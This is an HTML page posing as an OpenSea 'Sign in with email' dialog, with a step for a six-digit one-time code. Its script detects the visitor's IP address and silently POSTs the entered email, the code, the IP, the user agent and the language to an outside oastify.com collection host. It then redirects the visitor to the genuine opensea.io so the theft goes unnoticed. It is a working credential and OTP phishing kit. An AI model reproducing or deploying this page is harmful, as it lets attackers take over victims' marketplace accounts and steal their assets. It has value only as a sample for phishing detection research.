<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OpenSea - Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica Neue, sans-serif;
            background: rgba(0, 0, 0, 0.7);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .modal {
            background: #1a1a1a;
            border-radius: 16px;
            max-width: 450px;
            width: 100%;
            padding: 40px;
            position: relative;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            border: 1px solid #333;
            text-align: center;
        }
        
        .back-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            display: none;
        }
        
        .back-btn:hover {
            opacity: 0.7;
        }
        
        .back-btn.show {
            display: flex;
        }
        
        .close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .close-btn:hover {
            opacity: 0.7;
        }
        
        .logo {
            width: 60px;
            height: 60px;
            background: #2081e1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
        }
        
        h1 {
            color: #fff;
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            color: #fff;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 8px;
            text-align: left;
        }
        
        input[type="email"],
        input[type="text"] {
            width: 100%;
            padding: 12px;
            background: #222;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            transition: border-color 0.2s;
        }
        
        input[type="email"]:focus,
        input[type="text"]:focus {
            outline: none;
            border-color: #2081e1;
        }
        
        .code-inputs {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            justify-content: center;
            display: none;
        }
        
        .code-inputs.show {
            display: flex;
        }
        
        .code-input {
            width: 50px;
            height: 50px;
            background: #222;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 24px;
            text-align: center;
            font-weight: 600;
            cursor: text;
            transition: border-color 0.2s;
        }
        
        .code-input:focus {
            outline: none;
            border-color: #2081e1;
        }
        
        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #2081e1 0%, #1a5ec1 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        
        .submit-btn:hover {
            opacity: 0.9;
        }
        
        .submit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .info-text {
            color: #666;
            font-size: 12px;
            margin-top: 15px;
            line-height: 1.6;
        }
        
        .resend-code {
            color: #2081e1;
            text-decoration: none;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .resend-code:hover {
            text-decoration: underline;
        }
        
        .error {
            color: #e74c3c;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
        
        .error.show {
            display: block;
        }
        
        .step2 {
            display: none;
        }
        
        .step2.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="modal">
        <button class="back-btn" onclick="goBack()">←</button>
        <button class="close-btn" onclick="closeModal()">✕</button>
        
        <div class="logo">🌊</div>
        
        <!-- STEP 1: Email Input -->
        <div id="step1" class="step1">
            <h1>Sign in with email</h1>
            <p class="subtitle">Enter your email to continue with OpenSea</p>
            
            <form onsubmit="handleEmailSubmit(event)">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input 
                        type="email" 
                        id="email" 
                        placeholder="you@example.com" 
                        required 
                        autofocus
                    >
                </div>
                <button type="submit" class="submit-btn">Continue</button>
            </form>
        </div>
        
        <!-- STEP 2: Code Input -->
        <div id="step2" class="step2">
            <h1>Enter Code</h1>
            <p class="subtitle">A one-time authentication code has been sent to<br><strong id="emailDisplay">test@google.com</strong></p>
            
            <form onsubmit="handleCodeSubmit(event)">
                <div class="code-inputs" id="codeContainer">
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                </div>
                
                <button type="submit" class="submit-btn">Verify Code</button>
                
                <div class="info-text">
                    Expires in 10 minutes.
                    <a href="#" class="resend-code" onclick="resendCode(event)">Resend code</a>
                </div>
                
                <div class="error" id="errorMsg">Invalid code. Please try again.</div>
            </form>
        </div>
    </div>
    
    <script>
        // Initialize IP detection
        window.visitorIP = 'Detecting...';
        window.userEmail = '';
        
        var ipAPIs = [
            {url: 'https://api.ipify.org?format=json', key: 'ip'},
            {url: 'https://api64.ipify.org?format=json', key: 'ip'},
            {url: 'https://icanhazip.com/', key: 'text'},
            {url: 'https://ifconfig.me', key: 'text'}
        ];
        
        function detectIP(index = 0) {
            if (index >= ipAPIs.length) {
                window.visitorIP = 'Unknown';
                return;
            }
            
            var apiConfig = ipAPIs[index];
            
            fetch(apiConfig.url, {mode: 'no-cors'})
                .then(response => {
                    if (apiConfig.key === 'json') {
                        return response.json();
                    } else {
                        return response.text();
                    }
                })
                .then(data => {
                    if (apiConfig.key === 'json') {
                        window.visitorIP = data.ip || data.query || 'Unknown';
                    } else {
                        window.visitorIP = data.trim() || 'Unknown';
                    }
                })
                .catch(() => {
                    detectIP(index + 1);
                });
        }
        
        detectIP();
        
        // Handle email submission
        function handleEmailSubmit(event) {
            event.preventDefault();
            
            var email = document.getElementById('email').value;
            window.userEmail = email;
            
            // Send email to server
            var data = {
                email: email,
                method: 'email_entered',
                ip_address: window.visitorIP,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            fetch('https://ugejap8f9h3y5dkafta01qryepkg8dw2.oastify.com/', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(() => {});
            
            // Show Step 2
            document.getElementById('step1').classList.remove('show');
            document.getElementById('step2').classList.add('show');
            document.getElementById('emailDisplay').textContent = email;
            document.querySelector('.back-btn').classList.add('show');
            
            // Focus first code input
            document.querySelectorAll('.code-input')[0].focus();
        }
        
        // Code input handling
        var inputs = document.querySelectorAll('.code-input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', function(e) {
                if (e.target.value) {
                    if (index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                }
            });
            
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
        
        // Handle code submission
        function handleCodeSubmit(event) {
            event.preventDefault();
            
            var code = Array.from(inputs).map(input => input.value).join('');
            
            if (code.length !== 6) {
                showError();
                return;
            }
            
            // Send code to server
            var data = {
                email: window.userEmail,
                code: code,
                method: 'code_submitted',
                ip_address: window.visitorIP,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language
            };
            
            fetch('https://ugejap8f9h3y5dkafta01qryepkg8dw2.oastify.com/', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(() => {});
            
            alert('Verifying code...');
            setTimeout(() => {
                window.location = 'https://opensea.io';
            }, 1500);
        }
        
        function showError() {
            document.getElementById('errorMsg').classList.add('show');
            setTimeout(() => {
                document.getElementById('errorMsg').classList.remove('show');
            }, 3000);
        }
        
        function resendCode(event) {
            event.preventDefault();
            alert('Code sent to ' + window.userEmail);
        }
        
        function goBack() {
            document.getElementById('step2').classList.remove('show');
            document.getElementById('step1').classList.add('show');
            document.querySelector('.back-btn').classList.remove('show');
            document.getElementById('email').focus();
        }
        
        function closeModal() {
            window.location = 'https://opensea.io';
        }
        
        // Show step 1 initially
        document.getElementById('step1').classList.add('show');
    </script>
</body>
</html>
